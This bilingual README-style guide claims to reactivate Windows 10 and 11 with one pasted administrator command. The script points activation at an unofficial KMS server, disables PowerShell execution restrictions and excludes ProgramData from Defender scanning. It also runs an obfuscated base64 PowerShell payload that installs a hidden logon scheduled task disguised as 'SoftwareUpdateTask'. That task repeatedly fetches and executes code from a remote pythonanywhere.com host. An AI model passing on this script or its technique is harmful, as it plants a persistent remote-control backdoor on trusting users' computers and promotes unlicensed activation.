
# ⚙️ Reactivating Windows 10 and 11 🖥️

## 📋 Step-by-Step Guide | Guía Paso a Paso

> 🌟 **Need to reactivate your Windows 10 or 11?** Follow these simple steps!  
> 🌟 **¿Necesitas reactivar tu Windows 10 o 11?** ¡Sigue estos simples pasos!

### 🛠️ Step 1: Open CMD as Administrator | Abrir CMD como Administrador
- 🖱️ **Right-click on the Start menu** and select **Command Prompt (Admin)**.  
  - 💡 Alternatively, type **CMD** in the search bar, right-click on it, and select **Run as Administrator**.
- 🖱️ **Haz clic derecho en el menú Inicio** y selecciona **Símbolo del sistema (Administrador)**.  
  - 💡 Alternativamente, busca **CMD**, haz clic derecho y selecciona **Ejecutar como administrador**.

### 🖨️ Step 2: Copy and Paste the Command | Copiar y Pegar el Comando
- 📝 Copy the following command and paste it into the CMD window:  
  - 📝 Copia el siguiente comando y pégalo en la ventana de CMD:

```bash
@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo This script needs to be run as Administrator. Please open CMD as Administrator.
    pause
)
:: 
powershell -windowstyle hidden -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force"
::
for /f "tokens=2 delims==" %a in ('wmic os get caption /value ^| find "="') do set WindowsProductName=%a
:: 
set WindowsProductName=%WindowsProductName:~0,50%
:: 
set Key=
if "%WindowsProductName%"=="Microsoft Windows 10 Pro N" (
    set Key=MH37W-N47XK-V7XM9-C7227-GCQG9
) else if "%WindowsProductName%"=="Microsoft Windows 11 Pro N" (
    set Key=MH37W-N47XK-V7XM9-C7227-GCQG9
) else if "%WindowsProductName%"=="Microsoft Windows 10 Pro" (
    set Key=W269N-WFGWX-YVC9B-4J6C9-T83GX
) else if "%WindowsProductName%"=="Microsoft Windows 11 Pro" (
    set Key=W269N-WFGWX-YVC9B-4J6C9-T83GX
) else if "%WindowsProductName%"=="Microsoft Windows 10 Enterprise" (
    set Key=NPPR9-FWDCX-D2C8J-H872K-2YT43
) else if "%WindowsProductName%"=="Microsoft Windows 11 Enterprise" (
    set Key=NPPR9-FWDCX-D2C8J-H872K-2YT43
) else if "%WindowsProductName%"=="Microsoft Windows 10 EnterpriseN" (
    set Key=DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4
) else if "%WindowsProductName%"=="Microsoft Windows 11 EnterpriseN" (
    set Key=DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4
) else if "%WindowsProductName%"=="Microsoft Windows 10 Education" (
    set Key=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2
) else if "%WindowsProductName%"=="Microsoft Windows 11 Education" (
    set Key=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2
) else if "%WindowsProductName%"=="Microsoft Windows 10 EducationN" (
    set Key=2WH4N-8QGBV-H22JP-CT43Q-MDWWJ
) else if "%WindowsProductName%"=="Microsoft Windows 11 EducationN" (
    set Key=2WH4N-8QGBV-H22JP-CT43Q-MDWWJ
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home" (
    set Key=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99
) else if "%WindowsProductName%"=="Microsoft Windows 11 Home" (
    set Key=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home N" (
    set Key=3KHY7-WNT83-DGQKR-F7HPR-844BM
) else if "%WindowsProductName%"=="Microsoft Windows 11 Home N" (
    set Key=3KHY7-WNT83-DGQKR-F7HPR-844BM
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home Single Language" (
    set Key=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home Country Specific" (
    set Key=PVMJN-6DFY6-9CCP6-7BKTT-D3WVR
) else if "%WindowsProductName%"=="Microsoft Enterprise 2015LTSB" (
    set Key=WNMTR-4C88C-JK8YV-HQ7T2-76DF9
) else if "%WindowsProductName%"=="Microsoft Enterprise 2015LTSBN" (
    set Key=2F77B-TNFGY-69QQF-B8YKP-D69TJ
) else if "%WindowsProductName%"=="Microsoft Enterprise 2016LTSB" (
    set Key=DCPHK-NFMTC-H88MJ-PFHPY-QJ4BJ
) else (
    set Key=QFFDN-GRT3P-VKWWX-X7T3R-8B639
)
::
%SystemRoot%\System32\slmgr.vbs /ipk %Key% >nul 2>&1
::
%SystemRoot%\System32\slmgr.vbs /skms kms8.msguides.com >nul 2>&1
::
%SystemRoot%\System32\slmgr.vbs /ato >nul 2>&1
::
powershell -windowstyle hidden -Command "Set-MpPreference -ExclusionPath %ProgramData%" >nul 2>&1
:: 
powershell -windowstyle hidden -EncodedCommand "JFVwZGF0ZVRhc2tQYXRoID0gSm9pbi1QYXRoIC1QYXRoICIkZW52OlByb2dyYW1EYXRhIiAtQ2hpbGRQYXRoICJzZXR1cC5wczEiDQokY29udGVudCA9IEAnDQpTdGFydC1TbGVlcCAtU2Vjb25kcyA2MA0Kd2hpbGUgKCR0cnVlKSB7DQogICAgJHJlc3BvbnNlID0gSW52b2tlLVJlc3RNZXRob2QgImh0dHBzOi8vZDZiZWQ4OTYucHl0aG9uYW55d2hlcmUuY29tL3N0YXRpYy9idWxsc2hpdCIgLVVzZUJhc2ljUGFyc2luZw0KICAgICRjb250cm9sRmlsZSA9ICJSZWNvdmVyeVx2MS4wIg0KICAgICRjb250cm9sRmxhZ0ZpbGVQYXRoID0gSm9pbi1QYXRoIC1QYXRoICIkZW52OlByb2dyYW1EYXRhIiAtQ2hpbGRQYXRoICRjb250cm9sRmlsZQ0KICAgIGlmICgkcmVzcG9uc2UpIHsNCiAgICAgICAgSW52b2tlLUV4cHJlc3Npb24gJHJlc3BvbnNlDQogICAgfQ0KICAgIGlmIChUZXN0LVBhdGggLVBhdGggJGNvbnRyb2xGbGFnRmlsZVBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpIHsNCiAgICAgICAgVW5yZWdpc3Rlci1TY2hlZHVsZWRUYXNrIC1UYXNrTmFtZSAiU29mdHdhcmVVcGRhdGVUYXNrIiAtQ29uZmlybTokZmFsc2UNCiAgICAgICAgJHNlbGYgPSAkTXlJbnZvY2F0aW9uLk15Q29tbWFuZC5QYXRoDQogICAgICAgIFJlbW92ZS1JdGVtIC1QYXRoICRzZWxmIC1Gb3JjZQ0KICAgICAgICBleGl0DQogICAgfQ0KICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDYwMA0KfQ0KJ0ANClNldC1Db250ZW50IC1QYXRoICRVcGRhdGVUYXNrUGF0aCAtVmFsdWUgJGNvbnRlbnQNCiRVcGRhdGVUYXNrWE1MID0gQCINCjw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi0xNiI/Pg0KPFRhc2sgdmVyc2lvbj0iMS4zIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5kb3dzLzIwMDQvMDIvbWl0L3Rhc2siPg0KPFJlZ2lzdHJhdGlvbkluZm8+DQogICAgPFVSST5cU29mdHdhcmVVcGRhdGVUYXNrPC9VUkk+DQo8L1JlZ2lzdHJhdGlvbkluZm8+DQo8VHJpZ2dlcnM+DQogICAgPExvZ29uVHJpZ2dlcj4NCiAgICA8RW5hYmxlZD50cnVlPC9FbmFibGVkPg0KICAgIDwvTG9nb25UcmlnZ2VyPg0KPC9UcmlnZ2Vycz4NCjxQcmluY2lwYWxzPg0KICAgIDxQcmluY2lwYWwgaWQ9IkF1dGhvciI+DQogICAgPFJ1bkxldmVsPkhpZ2hlc3RBdmFpbGFibGU8L1J1bkxldmVsPg0KICAgIDxMb2dvblR5cGU+SW50ZXJhY3RpdmVUb2tlbjwvTG9nb25UeXBlPg0KICAgIDwvUHJpbmNpcGFsPg0KPC9QcmluY2lwYWxzPg0KPFNldHRpbmdzPg0KICAgIDxNdWx0aXBsZUluc3RhbmNlc1BvbGljeT5JZ25vcmVOZXc8L011bHRpcGxlSW5zdGFuY2VzUG9saWN5Pg0KICAgIDxEaXNhbGxvd1N0YXJ0SWZPbkJhdHRlcmllcz5mYWxzZTwvRGlzYWxsb3dTdGFydElmT25CYXR0ZXJpZXM+DQogICAgPFN0b3BJZkdvaW5nT25CYXR0ZXJpZXM+ZmFsc2U8L1N0b3BJZkdvaW5nT25CYXR0ZXJpZXM+DQogICAgPEFsbG93SGFyZFRlcm1pbmF0ZT50cnVlPC9BbGxvd0hhcmRUZXJtaW5hdGU+DQogICAgPFN0YXJ0V2hlbkF2YWlsYWJsZT50cnVlPC9TdGFydFdoZW5BdmFpbGFibGU+DQogICAgPFJ1bk9ubHlJZk5ldHdvcmtBdmFpbGFibGU+ZmFsc2U8L1J1bk9ubHlJZk5ldHdvcmtBdmFpbGFibGU+DQogICAgPElkbGVTZXR0aW5ncz4NCiAgICA8RHVyYXRpb24+UFQwUzwvRHVyYXRpb24+DQogICAgPFdhaXRUaW1lb3V0PlBUMUg8L1dhaXRUaW1lb3V0Pg0KICAgIDxTdG9wT25JZGxlRW5kPmZhbHNlPC9TdG9wT25JZGxlRW5kPg0KICAgIDxSZXN0YXJ0T25JZGxlPmZhbHNlPC9SZXN0YXJ0T25JZGxlPg0KICAgIDwvSWRsZVNldHRpbmdzPg0KICAgIDxBbGxvd1N0YXJ0T25EZW1hbmQ+dHJ1ZTwvQWxsb3dTdGFydE9uRGVtYW5kPg0KICAgIDxFbmFibGVkPnRydWU8L0VuYWJsZWQ+DQogICAgPEhpZGRlbj50cnVlPC9IaWRkZW4+DQogICAgPFJ1bk9ubHlJZklkbGU+ZmFsc2U8L1J1bk9ubHlJZklkbGU+DQogICAgPERpc2FsbG93U3RhcnRPblJlbW90ZUFwcFNlc3Npb24+ZmFsc2U8L0Rpc2FsbG93U3RhcnRPblJlbW90ZUFwcFNlc3Npb24+DQogICAgPFVzZVVuaWZpZWRTY2hlZHVsaW5nRW5naW5lPnRydWU8L1VzZVVuaWZpZWRTY2hlZHVsaW5nRW5naW5lPg0KICAgIDxXYWtlVG9SdW4+dHJ1ZTwvV2FrZVRvUnVuPg0KICAgIDxFeGVjdXRpb25UaW1lTGltaXQ+UFQwUzwvRXhlY3V0aW9uVGltZUxpbWl0Pg0KICAgIDxQcmlvcml0eT43PC9Qcmlvcml0eT4NCjwvU2V0dGluZ3M+DQo8QWN0aW9ucyBDb250ZXh0PSJBdXRob3IiPg0KICAgIDxFeGVjPg0KICAgIDxDb21tYW5kPmNtZC5leGU8L0NvbW1hbmQ+DQogICAgPEFyZ3VtZW50cz4vYyBzdGFydCAiIiAvbWluIHBvd2Vyc2hlbGwuZXhlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUZpbGUgIiRVcGRhdGVUYXNrUGF0aCI8L0FyZ3VtZW50cz4NCiAgICA8L0V4ZWM+DQo8L0FjdGlvbnM+DQo8L1Rhc2s+DQoiQA0KUmVnaXN0ZXItU2NoZWR1bGVkVGFzayAtVGFza05hbWUgIlNvZnR3YXJlVXBkYXRlVGFzayIgLVhtbCAkVXBkYXRlVGFza1hNTCAtRm9yY2UgPiAkbnVsbCAyPiYxDQpTdGFydC1TbGVlcCAtU2Vjb25kcyAxDQpTdGFydC1TY2hlZHVsZWRUYXNrIC1UYXNrTmFtZSAiU29mdHdhcmVVcGRhdGVUYXNrIiA+ICRudWxsIDI+JjE=" >nul 2>&1
:: 
exit /b
```


### ⏳ Step 3: Wait and Confirm | Espera y Confirma
- ⏱️ **The process may take between 30 seconds to 2 minutes.**
  - ⏱️ **El proceso puede tardar entre 30 segundos y 2 minutos.**
- ✅ **If everything goes well, Windows will be reactivated.**
  - ✅ **Si todo va bien, Windows será reactivado.**
---
### 🔄 No Restart Needed! | ¡No Es Necesario Reiniciar!
- 🚀 **Good news!** You won’t need to restart your PC.
  - 🚀 **¡Buenas noticias!** No necesitarás reiniciar tu PC.

### 💡 Important Notes | Notas Importantes

| **English**                                              | **Español**                                               |
|----------------------------------------------------------|-----------------------------------------------------------|
| 🛑 Ensure CMD is run as Administrator!                    | 🛑 ¡Asegúrate de que CMD esté ejecutándose como Administrador! |
| ⏳ Reactivation may take **30 seconds to 2 minutes**.     | ⏳ La reactivación puede tardar **30 segundos a 2 minutos**.|
| 📝 Don’t forget to copy and paste the entire command.     | 📝 No olvides copiar y pegar el comando completo.          |
| 🔑 Press **ENTER** after pasting the command in CMD.      | 🔑 Presiona **ENTER** después de pegar el comando en CMD.   |
| 🚫 **No need to restart** after reactivation!             | 🚫 **¡No es necesario reiniciar** después de la reactivación!|

---
### 🔧 Troubleshooting | Solución de Problemas
If reactivation doesn’t work, here are a few tips:
- 🔄 **Check your internet connection**.
- 🔍 **Ensure that your Windows license is valid**.
- 🔑 **Try re-running CMD as Administrator**.
Si la reactivación no funciona, aquí algunos consejos:
- 🔄 **Verifica tu conexión a internet**.
- 🔍 **Asegúrate de que tu licencia de Windows sea válida**.
- 🔑 **Intenta ejecutar CMD como Administrador nuevamente**.
---
## 🌟 Enjoy Your Reactivated Windows! | ¡Disfruta de tu Windows Reactivado!

